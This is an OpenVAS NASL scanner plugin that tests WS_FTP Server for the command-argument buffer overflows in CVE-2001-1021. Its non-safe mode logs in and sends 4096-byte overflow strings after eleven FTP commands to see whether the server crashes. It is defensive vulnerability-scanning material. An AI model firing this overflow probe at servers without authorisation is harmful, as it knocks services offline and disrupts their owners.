# OpenVAS Vulnerability Test
# $Id: wsftp_overflows.nasl 17 2013-10-27 14:01:43Z jan $
# Description: WS FTP overflows
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to shut down the remote
FTP server by issuing a command followed by a too long argument.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system.";

tag_solution = "upgrade to the latest version your FTP server.";

if(description)
{
 script_id(11094);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2001-1021");
 name = "WS FTP overflows";
 
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;




 script_description(desc);
 
 summary = "Attempts a buffer overflow on many commands";
 script_summary(summary);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "FTP";
 script_family(family);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include ("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port) port = 21;
if (! get_port_state(port)) exit(0);

if (safe_checks() || ! get_kb_item("ftp/login"))
{
  m = "According to its version number, your remote WS_FTP server
is vulnerable to a buffer overflow against any command.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system.

** OpenVAS only check the version number in the server banner
** To really check the vulnerability, disable safe_checks

Solution: upgrade to the latest version your FTP server.";

  banner = get_ftp_banner(port);

  if (egrep(pattern:"WS_FTP Server 2\.0\.[0-2]", string: banner))
	security_hole(port: port, data: m);
  exit(0);
}

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login) login = "ftp";
if (! password) password = "test@openvas.org";

soc = open_sock_tcp(port);
if(! soc) exit(0);
if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  ftp_close(socket: soc);
  exit(0);
}

cmd[0] = "DELE";
cmd[1] = "MDTM";
cmd[2] = "MLST";
cmd[3] = "MKD";
cmd[4] = "RMD";
cmd[5] = "RNFR";
cmd[6] = "RNTO";
cmd[7] = "SIZE";
cmd[8] = "STAT";
cmd[9] = "XMKD";
cmd[10] = "XRMD ";

pb=0;
for (i=0; i<11; i=i+1)
{
  s = string(cmd[i], " /", crap(4096), "\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  #if(!r) pb=pb+1;
  ftp_close(socket: soc);
 
  soc = open_sock_tcp(port);
  if (! soc) { security_hole(port); exit(0); }
  ftp_authenticate(socket:soc, user:login, pass:password);
}

ftp_close(socket: soc);

#if (pb) security_warning(port);	# => False positive?
